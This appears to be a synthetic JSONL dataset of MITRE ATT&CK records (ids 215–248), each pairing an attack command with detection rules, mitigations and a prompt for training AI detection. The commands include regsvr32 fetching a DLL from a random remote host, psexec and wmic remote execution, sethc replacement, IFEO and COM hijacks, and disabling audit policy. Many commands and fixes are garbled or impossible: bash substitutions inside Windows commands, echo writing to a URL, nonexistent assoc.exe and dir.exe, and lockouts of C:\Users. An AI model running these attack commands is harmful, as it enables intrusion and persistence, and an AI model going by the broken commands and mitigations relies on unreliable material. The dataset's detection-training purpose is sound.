{"id":215,"tactic":"Defense Evasion","technique":"T1218.010: Regsvr32","threat":"Using regsvr32 to execute malicious DLL via remote script.","command":"regsvr32 /s /i:http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor regsvr32 remote: `wmic process where name='regsvr32.exe' get commandline | findstr http`; YARA rule: `rule Regsvr32RemoteDll { strings: $a = /regsvr32.*http.*dll/ nocase; condition: $a }`.","mitigation":"Restrict regsvr32: `icacls %windir%\\System32\\regsvr32.exe /deny Everyone:RX`; Block DLL downloads: `netsh advfirewall firewall add rule name='Block regsvr32' dir=out program='%windir%\\System32\\regsvr32.exe' action=block`.","references":["MITRE ATT&CK T1218.010: https://attack.mitre.org/techniques/T1218/010/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect regsvr32 remote DLL execution and suggest firewall rules."}
{"id":216,"tactic":"Execution","technique":"T1059.006: Python","threat":"Using Python to abuse aws CLI for unauthorized EC2 instance creation.","command":"python -c \"import os; os.system('aws ec2 run-instances --image-id ami-$(cat /dev/urandom | tr -dc 'a-f0-9' | head -c 8) --count 1 --instance-type t2.micro --user-data file://$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sh)')\"","detection":"Monitor aws CLI: `wmic process where name='python.exe' get commandline | findstr aws`; Audit AWS logs: CloudTrail.","mitigation":"Restrict aws CLI: `icacls %userprofile%\\.aws /deny Everyone:RX`; Enforce MFA: AWS IAM policies.","references":["MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect unauthorized aws CLI execution and suggest MFA enforcement."}
{"id":217,"tactic":"Collection","technique":"T1119: Automated Collection","threat":"Using findstr to collect sensitive data from log files.","command":"findstr /s /i password C:\\Logs\\*.log > $(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor findstr: `wmic process where name='findstr.exe' get commandline | findstr password`; Event ID 4663.","mitigation":"Restrict findstr: `icacls %windir%\\System32\\findstr.exe /deny Everyone:RX`; Protect log files: `icacls C:\\Logs /deny Everyone:R`.","references":["MITRE ATT&CK T1119: https://attack.mitre.org/techniques/T1119/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect findstr log data collection and suggest file protections."}
{"id":218,"tactic":"Lateral Movement","technique":"T1021.004: Remote Services: SSH","threat":"Using ssh to execute commands on remote Linux host.","command":"ssh $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com \"bash -c '/tmp/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)sh'\"","detection":"Monitor ssh: `ps aux | grep ssh | grep bash`; Monitor SSH traffic: `netstat -anp | grep :22`.","mitigation":"Restrict ssh: `chmod 700 /usr/bin/ssh`; Block SSH outbound: `iptables -A OUTPUT -p tcp --dport 22 -j DROP`.","references":["MITRE ATT&CK T1021.004: https://attack.mitre.org/techniques/T1021/004/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect SSH remote execution and suggest firewall rules."}
{"id":219,"tactic":"Persistence","technique":"T1546.006: LC_LOAD_DYLIB Addition","threat":"Injecting malicious dylib into macOS binary remotely.","command":"install_name_tool -add_rpath http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dylib /Applications/$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8).app/Contents/MacOS/*","detection":"Monitor dylib changes: `otool -L /Applications/* | grep http`; Audit file changes: `auditctl -w /Applications -p wa`.","mitigation":"Restrict dylib modifications: `chmod 755 /Applications/*`; Enable SIP: `csrutil enable`.","references":["MITRE ATT&CK T1546.006: https://attack.mitre.org/techniques/T1546/006/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote dylib injections and suggest SIP enforcement."}
{"id":220,"tactic":"Defense Evasion","technique":"T1218.007: Msiexec","threat":"Using msiexec to execute malicious MSI via SMB share.","command":"msiexec /quiet /i \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msi) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor msiexec SMB: `wmic process where name='msiexec.exe' get commandline | findstr \\\\`; YARA rule: `rule MsiexecSmb { strings: $a = /msiexec.*\\\\/ nocase; condition: $a }`.","mitigation":"Restrict msiexec: `icacls %windir%\\System32\\msiexec.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1218.007: https://attack.mitre.org/techniques/T1218/007/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect msiexec SMB execution and suggest SMB restrictions."}
{"id":221,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using cacls to modify permissions for malicious access.","command":"cacls C:\\$(echo target$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)) /E /G $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8):F","detection":"Monitor cacls: `wmic process where name='cacls.exe' get commandline | findstr /G`; Event ID 4663.","mitigation":"Restrict cacls: `icacls %windir%\\System32\\cacls.exe /deny Everyone:RX`; Audit permission changes: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cacls permission abuse and suggest auditing."}
{"id":222,"tactic":"Collection","technique":"T1074.001: Data Staged: Local Data Staging","threat":"Using xcopy to stage sensitive files for exfiltration.","command":"xcopy C:\\Users\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\Documents\\*.docx C:\\$(echo stage$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)) /S /I","detection":"Monitor xcopy: `wmic process where name='xcopy.exe' get commandline | findstr docx`; Event ID 4663.","mitigation":"Restrict xcopy: `icacls %windir%\\System32\\xcopy.exe /deny Everyone:RX`; Protect sensitive directories: `icacls C:\\Users /deny Everyone:RX`.","references":["MITRE ATT&CK T1074.001: https://attack.mitre.org/techniques/T1074/001/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect xcopy data staging and suggest directory protections."}
{"id":223,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using rpcclient to execute commands via SMB.","command":"rpcclient -U $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)%$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com -c \"cmd /c C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat)\"","detection":"Monitor rpcclient: `ps aux | grep rpcclient | grep cmd`; Monitor SMB traffic: `netstat -anp | grep :445`.","mitigation":"Restrict rpcclient: `chmod 700 /usr/bin/rpcclient`; Block SMB: `iptables -A INPUT -p tcp --dport 445 -j DROP`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect rpcclient SMB execution and suggest SMB restrictions."}
{"id":224,"tactic":"Persistence","technique":"T1547.002: Authentication Package","threat":"Registering malicious authentication package for persistence.","command":"reg add \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v Authentication Packages /t REG_MULTI_SZ /d \"$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8))\\0msv1_0\"","detection":"Monitor LSA changes: `reg query \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\" /v Authentication Packages`; Event ID 4657.","mitigation":"Restrict LSA writes: `regini -h deny \"HKLM\\System\\CurrentControlSet\\Control\\Lsa\"`; Audit LSA changes.","references":["MITRE ATT&CK T1547.002: https://attack.mitre.org/techniques/T1547/002/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect LSA authentication package tampering and suggest registry protections."}
{"id":225,"tactic":"Defense Evasion","technique":"T1218.003: CMSTP","threat":"Using cmstp.exe to execute malicious INF via remote share.","command":"cmstp /ni /s \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).inf) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor cmstp SMB: `wmic process where name='cmstp.exe' get commandline | findstr \\\\`; YARA rule: `rule CmstpSmbInf { strings: $a = /cmstp.*\\\\/ nocase; condition: $a }`.","mitigation":"Restrict cmstp: `icacls %windir%\\System32\\cmstp.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1218.003: https://attack.mitre.org/techniques/T1218/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect cmstp SMB INF execution and suggest SMB restrictions."}
{"id":226,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse auditpol.exe for audit policy manipulation.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; auditpol /set /category:'$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8)' /success:disable /failure:disable\"","detection":"Monitor auditpol: `wmic process where name='auditpol.exe' get commandline | findstr disable`; Event ID 4719.","mitigation":"Restrict auditpol: `icacls %windir%\\System32\\auditpol.exe /deny Everyone:RX`; Audit policy changes: `auditpol /set /subcategory:'Policy Change' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect auditpol manipulation and suggest policy auditing."}
{"id":227,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using wevtutil to collect event logs for analysis.","command":"wevtutil qe Security /f:text /q:\"*[System[(EventID=4624)]]\" > $(echo logs$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor wevtutil: `wmic process where name='wevtutil.exe' get commandline | findstr Security`; Event ID 4663.","mitigation":"Restrict wevtutil: `icacls %windir%\\System32\\wevtutil.exe /deny Everyone:RX`; Protect event logs: `icacls %windir%\\System32\\winevt\\Logs /deny Everyone:R`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect wevtutil log collection and suggest log protections."}
{"id":228,"tactic":"Lateral Movement","technique":"T1021.005: Remote Services: VNC","threat":"Using vncviewer to initiate malicious VNC session.","command":"vncviewer $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com::$(shuf -i 1000-65535 -n 1) -passwd $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor vncviewer: `wmic process where name='vncviewer.exe' get commandline | findstr passwd`; Monitor VNC traffic: `netstat -anp | grep :5900`.","mitigation":"Restrict vncviewer: `icacls %programfiles%\\TightVNC\\vncviewer.exe /deny Everyone:RX`; Block VNC: `netsh advfirewall firewall add rule name='Block VNC' dir=out action=block protocol=TCP remoteport=5900`.","references":["MITRE ATT&CK T1021.005: https://attack.mitre.org/techniques/T1021/005/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect vncviewer abuse and suggest VNC restrictions."}
{"id":229,"tactic":"Persistence","technique":"T1546.013: PowerShell Profile","threat":"Injecting malicious code into PowerShell profile remotely.","command":"echo \"I$(echo 'malicious' | base64 -w0)\" >> http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$PROFILE.CurrentUserAllHosts","detection":"Monitor PowerShell profiles: `Get-Content $PROFILE.CurrentUserAllHosts | findstr http`; Event ID 4663.","mitigation":"Restrict profile writes: `icacls $PROFILE.CurrentUserAllHosts /deny Everyone:WX`; Block profile downloads: `netsh advfirewall firewall add rule name='Block PowerShell Profile' dir=out action=block protocol=HTTP`.","references":["MITRE ATT&CK T1546.013: https://attack.mitre.org/techniques/T1546/013/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote PowerShell profile tampering and suggest firewall rules."}
{"id":230,"tactic":"Defense Evasion","technique":"T1218.008: Odbcconf","threat":"Using odbcconf.exe to execute malicious driver via SMB share.","command":"odbcconf /S /A {CONFIGSYSDSN \"\\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).dll) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"}","detection":"Monitor odbcconf SMB: `wmic process where name='odbcconf.exe' get commandline | findstr \\\\`; YARA rule: `rule OdbcconfSmbDll { strings: $a = /odbcconf.*\\\\/ nocase; condition: $a }`.","mitigation":"Restrict odbcconf: `icacls %windir%\\System32\\odbcconf.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1218.008: https://attack.mitre.org/techniques/T1218/008/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect odbcconf SMB driver execution and suggest SMB restrictions."}
{"id":231,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using icacls to grant malicious permissions to registry key.","command":"icacls \"HKLM\\Software\\$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8)\" /grant $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8):F /t","detection":"Monitor icacls registry: `wmic process where name='icacls.exe' get commandline | findstr HKLM`; Event ID 4657.","mitigation":"Restrict icacls: `icacls %windir%\\System32\\icacls.exe /deny Everyone:RX`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect icacls registry permission abuse and suggest auditing."}
{"id":232,"tactic":"Collection","technique":"T1119: Automated Collection","threat":"Using dir to collect sensitive file listings.","command":"dir C:\\Users\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\Documents /s /b | findstr .docx > $(echo files$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor dir: `wmic process where name='dir.exe' get commandline | findstr docx`; Event ID 4663.","mitigation":"Restrict dir: `icacls %windir%\\System32\\dir.exe /deny Everyone:RX`; Protect sensitive directories: `icacls C:\\Users /deny Everyone:R`.","references":["MITRE ATT&CK T1119: https://attack.mitre.org/techniques/T1119/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect dir file collection and suggest directory protections."}
{"id":233,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using wmic to execute commands on remote SMB share.","command":"wmic /node:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /user:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) /password:$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) process call create \"cmd /c C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).bat)\"","detection":"Monitor wmic remote: `wmic process where name='wmic.exe' get commandline | findstr /node`; Event ID 4688.","mitigation":"Restrict wmic: `icacls %windir%\\System32\\wbem\\wmic.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect wmic SMB execution and suggest SMB restrictions."}
{"id":234,"tactic":"Persistence","technique":"T1546.015: Component Object Model Hijacking","threat":"Hijacking COM object remotely for persistence.","command":"reg add HKCU\\Software\\Classes\\CLSID\\{$(uuidgen)} /v AppID /t REG_SZ /d \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor COM hijacking: `reg query HKCU\\Software\\Classes\\CLSID | findstr http`; Event ID 4657.","mitigation":"Restrict COM writes: `regini -h deny HKCU\\Software\\Classes\\CLSID`; Block COM downloads: `netsh advfirewall firewall add rule name='Block COM' dir=out action=block protocol=HTTP`.","references":["MITRE ATT&CK T1546.015: https://attack.mitre.org/techniques/T1546/015/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote COM hijacking and suggest firewall rules."}
{"id":235,"tactic":"Defense Evasion","technique":"T1218.001: Compiled HTML File","threat":"Using hh.exe to execute malicious CHM via SMB share.","command":"hh \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).chm) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor hh SMB: `wmic process where name='hh.exe' get commandline | findstr \\\\`; YARA rule: `rule HhSmbChm { strings: $a = /hh.*\\\\/ nocase; condition: $a }`.","mitigation":"Restrict hh: `icacls %windir%\\hh.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1218.001: https://attack.mitre.org/techniques/T1218/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect hh SMB CHM execution and suggest SMB restrictions."}
{"id":236,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using takeown to seize ownership of sensitive files.","command":"takeown /f C:\\$(echo target$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt) /r /d y","detection":"Monitor takeown: `wmic process where name='takeown.exe' get commandline | findstr /f`; Event ID 4663.","mitigation":"Restrict takeown: `icacls %windir%\\System32\\takeown.exe /deny Everyone:RX`; Audit file ownership changes: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect takeown abuse and suggest auditing."}
{"id":237,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using esentutl to collect database files.","command":"esentutl /y %windir%\\System32\\config\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).edb /d $(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).edb)","detection":"Monitor esentutl: `wmic process where name='esentutl.exe' get commandline | findstr edb`; Event ID 4663.","mitigation":"Restrict esentutl: `icacls %windir%\\System32\\esentutl.exe /deny Everyone:RX`; Protect database files: `icacls %windir%\\System32\\config /deny Everyone:R`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect esentutl database collection and suggest file protections."}
{"id":238,"tactic":"Lateral Movement","technique":"T1021.002: Remote Services: SMB/Windows Admin Shares","threat":"Using psexec to execute commands on remote SMB share.","command":"psexec \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -u $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12) -c C:\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor psexec: `wmic process where name='psexec.exe' get commandline | findstr -c`; Event ID 5145.","mitigation":"Restrict psexec: `icacls %programfiles%\\Sysinternals\\psexec.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1021.002: https://attack.mitre.org/techniques/T1021/002/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect psexec SMB execution and suggest SMB restrictions."}
{"id":239,"tactic":"Persistence","technique":"T1546.008: Accessibility Features","threat":"Abusing sethc.exe for persistence via replacement.","command":"copy /y $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) %windir%\\System32\\sethc.exe","detection":"Monitor sethc changes: `dir %windir%\\System32\\sethc.exe /a`; Event ID 4657.","mitigation":"Restrict sethc: `icacls %windir%\\System32\\sethc.exe /deny Everyone:WX`; Enable file integrity monitoring: `sfc /scannow`.","references":["MITRE ATT&CK T1546.008: https://attack.mitre.org/techniques/T1546/008/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect sethc tampering and suggest file protections."}
{"id":240,"tactic":"Defense Evasion","technique":"T1218.014: MMC","threat":"Using mmc.exe to execute malicious MSC via SMB share.","command":"mmc \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).msc) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor mmc SMB: `wmic process where name='mmc.exe' get commandline | findstr \\\\`; YARA rule: `rule MmcSmbMsc { strings: $a = /mmc.*\\\\/ nocase; condition: $a }`.","mitigation":"Restrict mmc: `icacls %windir%\\System32\\mmc.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1218.014: https://attack.mitre.org/techniques/T1218/014/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect mmc SMB MSC execution and suggest SMB restrictions."}
{"id":241,"tactic":"Execution","technique":"T1059.001: PowerShell","threat":"Using PowerShell to abuse logman.exe for performance log manipulation.","command":"powershell -c \"$(for($i=0;$i-lt50;$i++){$r+=([char](97+($i%26)))})$r; logman create counter $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) -c '\\$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8)\\*' -f bin -o C:\\$(echo log$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).blg)\"","detection":"Monitor logman: `wmic process where name='logman.exe' get commandline | findstr create`; Event ID 4688.","mitigation":"Restrict logman: `icacls %windir%\\System32\\logman.exe /deny Everyone:RX`; Audit performance logs: `auditpol /set /subcategory:'Object Access' /success:enable`.","references":["MITRE ATT&CK T1059.001: https://attack.mitre.org/techniques/T1059/001/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect logman abuse and suggest log auditing."}
{"id":242,"tactic":"Collection","technique":"T1119: Automated Collection","threat":"Using fsutil to collect file system metadata.","command":"fsutil fsinfo ntfsinfo C: > $(echo fs$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor fsutil: `wmic process where name='fsutil.exe' get commandline | findstr fsinfo`; Event ID 4663.","mitigation":"Restrict fsutil: `icacls %windir%\\System32\\fsutil.exe /deny Everyone:RX`; Audit file system access: `auditpol /set /subcategory:'File System' /success:enable`.","references":["MITRE ATT&CK T1119: https://attack.mitre.org/techniques/T1119/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect fsutil metadata collection and suggest file system auditing."}
{"id":243,"tactic":"Lateral Movement","technique":"T1021.001: Remote Desktop Protocol","threat":"Using qwinsta to enumerate RDP sessions for lateral movement.","command":"qwinsta /server:$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com > $(echo rdp$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor qwinsta: `wmic process where name='qwinsta.exe' get commandline | findstr /server`; Event ID 4688.","mitigation":"Restrict qwinsta: `icacls %windir%\\System32\\qwinsta.exe /deny Everyone:RX`; Disable RDP: `reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 1 /f`.","references":["MITRE ATT&CK T1021.001: https://attack.mitre.org/techniques/T1021/001/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect qwinsta RDP enumeration and suggest RDP restrictions."}
{"id":244,"tactic":"Persistence","technique":"T1546.012: Image File Execution Options Injection","threat":"Using IFEO remotely to inject malicious debugger.","command":"reg add \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe\" /v Debugger /t REG_SZ /d \"http://$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com/$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)\"","detection":"Monitor IFEO: `reg query \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\" | findstr http`; Event ID 4657.","mitigation":"Restrict IFEO writes: `regini -h deny \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\"`; Block debugger downloads: `netsh advfirewall firewall add rule name='Block IFEO' dir=out action=block protocol=HTTP`.","references":["MITRE ATT&CK T1546.012: https://attack.mitre.org/techniques/T1546/012/","CWE-732: https://cwe.mitre.org/data/definitions/732.html"],"ai_training_prompt":"Train AI to detect remote IFEO debugger injections and suggest firewall rules."}
{"id":245,"tactic":"Defense Evasion","technique":"T1218.004: InstallUtil","threat":"Using InstallUtil.exe to execute malicious .NET binary via SMB share.","command":"InstallUtil /logfile= /LogToConsole=false /U \\\\$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)\\$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe) /p $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)","detection":"Monitor InstallUtil SMB: `wmic process where name='InstallUtil.exe' get commandline | findstr \\\\`; YARA rule: `rule InstallUtilSmb { strings: $a = /InstallUtil.*\\\\/ nocase; condition: $a }`.","mitigation":"Restrict InstallUtil: `icacls %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe /deny Everyone:RX`; Block SMB: `netsh advfirewall firewall add rule name='Block SMB' dir=in action=block protocol=TCP localport=445`.","references":["MITRE ATT&CK T1218.004: https://attack.mitre.org/techniques/T1218/004/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect InstallUtil SMB execution and suggest SMB restrictions."}
{"id":246,"tactic":"Execution","technique":"T1059.003: Windows Command Shell","threat":"Using assoc to modify file associations for malicious execution.","command":"assoc .txt=$(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe)","detection":"Monitor assoc changes: `assoc | findstr evil`; Event ID 4657.","mitigation":"Restrict assoc: `icacls %windir%\\System32\\assoc.exe /deny Everyone:RX`; Audit registry changes: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1059.003: https://attack.mitre.org/techniques/T1059/003/","CWE-78: https://cwe.mitre.org/data/definitions/78.html"],"ai_training_prompt":"Train AI to detect assoc file association abuse and suggest auditing."}
{"id":247,"tactic":"Collection","technique":"T1005: Data from Local System","threat":"Using reg.exe to collect registry data.","command":"reg query HKLM\\Software\\$(cat /dev/urandom | tr -dc 'A-Za-z' | head -c 8) /s > $(echo reg$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)","detection":"Monitor reg query: `wmic process where name='reg.exe' get commandline | findstr query`; Event ID 4663.","mitigation":"Restrict reg: `icacls %windir%\\System32\\reg.exe /deny Everyone:RX`; Audit registry access: `auditpol /set /subcategory:'Registry' /success:enable`.","references":["MITRE ATT&CK T1005: https://attack.mitre.org/techniques/T1005/","CWE-200: https://cwe.mitre.org/data/definitions/200.html"],"ai_training_prompt":"Train AI to detect reg.exe registry collection and suggest registry auditing."}
{"id":248,"tactic":"Lateral Movement","technique":"T1021.004: Remote Services: SSH","threat":"Using scp to copy malicious payload to remote Linux host.","command":"scp $(echo evil$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).sh) $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)@$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com:/tmp","detection":"Monitor scp: `ps aux | grep scp | grep sh`; Monitor SSH traffic: `netstat -anp | grep :22`.","mitigation":"Restrict scp: `chmod 700 /usr/bin/scp`; Block SSH outbound: `iptables -A OUTPUT -p tcp --dport 22 -j DROP`.","references":["MITRE ATT&CK T1021.004: https://attack.mitre.org/techniques/T1021/004/","CWE-284: https://cwe.mitre.org/data/definitions/284.html"],"ai_training_prompt":"Train AI to detect scp payload transfer and suggest SSH restrictions."}
